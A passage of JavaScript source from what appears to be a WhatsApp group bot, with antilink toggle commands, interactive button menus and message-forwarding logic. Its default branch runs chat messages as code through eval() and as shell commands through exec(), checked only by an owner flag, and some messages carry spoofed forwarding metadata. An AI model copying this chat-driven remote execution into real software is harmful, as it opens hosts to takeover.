mikupoxy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return poxreply('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
poxreply('Success in turning off all antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: mikupoxy.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: 'l120363335802741292@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await mikupoxy.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
break
case 'antilink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isOwner) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (Antilinkgc) return poxreply('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
poxreply('Success in turning on in this group')
var groupe = await mikupoxy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
mikupoxy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return poxreply('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
poxreply('Success in turning off in this group')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: mikupoxy.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: 'l120363335802741292@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await mikupoxy.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
break

default:

if (budy.startsWith('<')) {
if (!isOwner) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('$')) {
                    if (!isOwner) return reply(mess.only.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return poxreply(err)
                        if (stdout) return poxreply(stdout)
                    })
                }


if (budy.startsWith('vv')) {
if (!isOwner) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
mikupoxy.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
mikupoxy.sendMessage(`${owner}@s.whatsapp.net`, { text: "Halo pengembang, sepertinya ada kesalahan, mohon diperbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
